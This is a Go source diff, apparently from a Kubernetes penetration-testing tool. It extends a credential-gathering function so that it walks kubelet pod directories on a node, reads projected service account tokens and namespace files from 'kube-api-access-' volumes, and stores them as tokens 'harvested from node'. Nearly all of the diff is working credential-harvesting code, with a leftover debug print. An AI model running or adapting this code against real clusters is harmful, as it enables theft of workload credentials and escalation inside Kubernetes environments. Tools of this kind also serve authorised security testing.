@@ -237,11 +237,12 @@ func gatherPodCredentials(serviceAccounts *[]ServiceAccount, interactive bool, r
 	var certsFound []string
 
 	const podVolumeSecretDir = "/volumes/kubernetes.io~secret/"
-
+	
 	for _, pod := range dirs {
 
 		podName := getPodName(kubeletPodsDir, pod.Name())
 
+		
 		// In each dir, we are seeking to find its secret volume mounts.
 		// Example:
 		// ls volumes/kubernetes.io~secret/
@@ -256,11 +257,15 @@ func gatherPodCredentials(serviceAccounts *[]ServiceAccount, interactive bool, r
 		if err != nil {
 			continue
 		}
+
 		for _, secret := range secrets {
 			secretName := secret.Name()
 
 			// First, see if this secret is a service account token.
 			if strings.Contains(secretName, "-token-") {
+				
+				// TODO: Abstract this code to make handling tokens found in podVolumeSecretDir and podVolumeSADir use the same code.
+
 				tokenFilePath := secretPath + secretName + "/token"
 				if _, err := os.Stat(tokenFilePath); os.IsNotExist(err) {
 					continue
@@ -369,6 +374,71 @@ func gatherPodCredentials(serviceAccounts *[]ServiceAccount, interactive bool, r
 			}
 		}
 
+
+	}
+
+	// As of Kubernetes 1.21, service account tokens are provided through projected volumes, added by the 
+	// Service Account token admission controller. For now, these are theoretically short-lived, but appear
+	// to last for a full year. If this timeline is reduced, we will need to refresh these tokens.
+	//  
+	// References: https://github.com/kubernetes/kubernetes/issues/70679 
+	//             https://github.com/kubernetes/kubernetes/issues/48408
+
+	// The service account tokens are placed via projected volumes:
+
+	const podVolumeSADir = "/volumes/kubernetes.io~projected/"
+	
+	for _, pod := range dirs {
+
+		podName := getPodName(kubeletPodsDir, pod.Name())
+
+	
+		serviceAccountPath := kubeletPodsDir + pod.Name() + podVolumeSADir
+		println("DEBUG: checking out directory " + serviceAccountPath)
+		if _, err := os.Stat(serviceAccountPath); os.IsNotExist(err) {
+			continue
+		}
+		serviceAccountDirs, err := ioutil.ReadDir(serviceAccountPath)
+		if err != nil {
+			continue
+		}
+		for _, saDir := range serviceAccountDirs {
+			saDirName := saDir.Name()
+			// First, see if this secret is a service account token.
+			if strings.Contains(saDirName, "kube-api-access-") {
+				
+				// TODO: Abstract this code to make handling tokens found in podVolumeSecretDir and podVolumeSADir use the same code.
+
+				tokenFilePath := serviceAccountPath + saDirName + "/token"
+				if _, err := os.Stat(tokenFilePath); os.IsNotExist(err) {
+					continue
+				}
+				tokenBytes, err := ioutil.ReadFile(tokenFilePath)
+				if err != nil {
+					continue
+				}
+				token := string(tokenBytes)
+
+				// If possible, name the token for the namespace
+				namespacePath := serviceAccountPath + saDirName + "/namespace"
+				if _, err := os.Stat(namespacePath); os.IsNotExist(err) {
+					continue
+				}
+				namespaceBytes, err := ioutil.ReadFile(namespacePath)
+				if err != nil {
+					continue
+				}
+				namespace := string(namespaceBytes)
+
+				_, tokenName := parseServiceAccountJWT(token)
+				fullSAName := "short-lived-sa/" + namespace + "/" + tokenName
+
+				// FEATURE REQUEST: spell out which node this was found on in the last arg.
+				if AddNewServiceAccount(fullSAName, string(token), "pod service account token harvested from node ", serviceAccounts) {
+					fmt.Println("[+] Found a short-lived service account token in pod " + podName + " on this node: " + fullSAName)
+				}
+			}
+		}
 	}
 
 	newServiceAccountsCount := len(*serviceAccounts) - startingNumberServiceAccounts
